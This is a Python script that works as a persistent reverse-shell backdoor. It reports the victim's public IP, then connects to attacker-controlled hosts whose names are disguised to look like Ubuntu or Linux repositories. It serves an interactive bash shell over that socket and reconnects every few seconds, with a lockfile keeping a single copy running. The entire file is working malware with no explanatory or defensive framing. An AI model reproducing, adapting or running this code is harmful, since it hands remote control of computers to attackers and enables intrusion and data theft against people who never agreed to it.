import socket
import os
import pty
import select
import subprocess
import time
import urllib.request
import json
import sys

LOCKFILE = "/tmp/cached_script.lock"

def check_and_acquire_lock():
    if os.path.exists(LOCKFILE):
        try:
            with open(LOCKFILE, "r") as f:
                pid = int(f.read().strip())
            # Check if the process ID is actively running on the system
            os.kill(pid, 0)
            sys.exit(0)
        except (OSError, ValueError):
            pass

    try:
        with open(LOCKFILE, "w") as f:
            f.write(str(os.getpid()))
    except:
        pass

def remove_lock():
    try:
        if os.path.exists(LOCKFILE):
            os.remove(LOCKFILE)
    except:
        pass

def main():
    check_and_acquire_lock()
    
    true_ip = "Unknown IP"
    try:
        req = urllib.request.Request(
            "http://ipinfo.io", 
            headers={'User-Agent': 'curl/7.68.0'}
        )
        with urllib.request.urlopen(req, timeout=4) as response:
            true_ip = json.loads(response.read().decode()).get("ip", "Unknown IP")
    except:
        pass

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            try:
                s.connect(("ubuntu-repo.strangled.net", 8090))
            except Exception:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("linux-x86-tcpudp.strangled.net", 21))
            
            s.send(f"{true_ip}\n".encode())
            
            master, slave = os.openpty()
            p = subprocess.Popen(
                ["/bin/bash", "-i"], 
                stdin=slave, stdout=slave, stderr=slave, 
                preexec_fn=os.setsid
            )
            os.close(slave)

            while p.poll() is None:
                r, w, x = select.select([s, master], [], [], 5)
                if not r:
                    try:
                        s.send(b"\x00") # Network check beacon
                    except:
                        break
                    continue

                for fd in r:
                    if fd == s:
                        data = s.recv(4096)
                        if not data: 
                            break
                        os.write(master, data)
                    elif fd == master:
                        data = os.read(master, 4096)
                        if not data: 
                            break
                        s.send(data)
                else:
                    continue
                break
                
            try:
                p.terminate()
                p.wait(timeout=2)
            except:
                pass
        except Exception:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            
        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    finally:
        remove_lock()
